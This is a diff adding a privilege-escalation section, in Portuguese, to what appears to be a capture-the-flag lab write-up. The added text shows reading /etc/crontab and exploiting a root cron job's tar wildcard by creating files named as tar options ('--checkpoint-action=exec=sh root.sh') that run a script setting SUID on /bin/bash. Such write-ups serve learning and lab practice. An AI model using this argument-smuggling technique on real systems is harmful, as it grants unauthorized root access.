@@ -95,4 +95,20 @@ export TERM=xterm
 Com isso é só buscar o arquivo do usuário e obter a primeira flag.
 
 ## 3. Escalação de Privilégios
+### 4.1 Vulnerabilidade de Cronjob e Wildcard
+Analisei as tarefas agendadas do sistema:
+`cat /etc/crontab`
+
+Havia um script executado pelo **root** a cada minuto: `/home/milesdyson/backups/backup.sh`. O script utilizava o comando `tar` com um caractere curinga (`*`) na pasta `/var/www/html`.
+
+### 4.2 Tar Wildcard Injection
+
+Exploitei a falha criando arquivos que o `tar` interpreta como argumentos de comando:
+```
+cd /var/www/html
+echo 'chmod +s /bin/bash' > root.sh
+touch ./--checkpoint=1
+touch "./--checkpoint-action=exec=sh root.sh"
+```
+Temos o root! 🚩
 
